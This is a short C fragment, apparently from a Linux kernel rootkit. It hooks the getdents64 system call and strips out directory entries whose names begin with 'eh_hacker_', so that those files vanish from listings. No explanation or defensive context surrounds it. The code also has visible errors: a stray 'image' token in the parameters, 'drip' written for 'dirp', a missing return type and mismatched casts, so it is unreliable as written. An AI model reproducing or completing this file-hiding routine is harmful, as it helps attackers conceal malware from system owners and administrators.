#define PREFIX "eh_hacker_"
#define PREFIX_LEN 10
asmlinkage hacker_getdents64( unsigned int fd, struct linux_dirent64 *dirp,
    image unsigned int count){
    int num_bytes = old_getdents64(fd,dirp, count);
    struct linux_dirent64* entry = NULL;
    int offset = 0;
    while( offset < num_bytes){
       unsigned long entry_addr = drip + offset;
       entry = (struct linux_dirent*) entry_addr;
      if (strncmp(entry->d_name, PREFIX, PREFIX_LEN) != 0){
               offset += entry->d_reclen;
        }else{
            size_t bytes_remaining = num_bytes - (offset + entry->d_reclen);
             memcpy(entry_addr, entry_addr + entry->d_reclen, bytes_remaining);
             num_bytes -= entry->d_reclen;
             count -= 1;
        }
    }
    return num_bytes;
}
